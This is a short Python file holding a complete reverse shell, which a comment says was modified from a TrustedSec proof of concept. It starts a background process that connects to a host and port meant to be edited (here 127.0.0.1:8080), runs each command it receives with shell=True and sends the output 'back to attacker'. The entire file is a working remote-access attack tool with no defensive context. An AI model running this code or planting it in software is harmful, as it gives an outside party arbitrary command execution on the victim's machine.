from multiprocessing import Process, Queue

# modded from https://www.trustedsec.com/files/RevShell_PoC_v1.py
# Think of the kids use encryption...


def moo():
    import socket
    import subprocess

    HOST = '127.0.0.1'     # EDIT Host...
    PORT = 8080            # The same port as used by the server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    # loop forever
    while 1:
        # recv command line param

        data = s.recv(1024)
        if b'exit' in data:
            break
        # execute command line
        proc = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        # grab output from commandline
        stdout_value = proc.stdout.read() + proc.stderr.read()
        # send back to attacker
        s.send(stdout_value)
    #quit out afterwards and kill socket
    s.close()

queue = Queue()
p = Process(target=moo, args=())
p.start()

